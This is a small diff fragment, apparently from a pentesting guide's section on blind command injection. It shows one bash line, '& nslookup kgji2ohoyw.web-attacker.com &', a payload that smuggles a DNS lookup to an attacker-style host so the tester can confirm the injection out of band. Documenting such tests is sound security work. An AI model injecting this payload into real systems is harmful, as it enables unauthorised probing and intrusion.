@@ -22,6 +22,7 @@ However, there’s no output of our command in the response, it might be vulnera
 {% endhint %}
 
 
+
 ```bash
 & nslookup kgji2ohoyw.web-attacker.com &
 
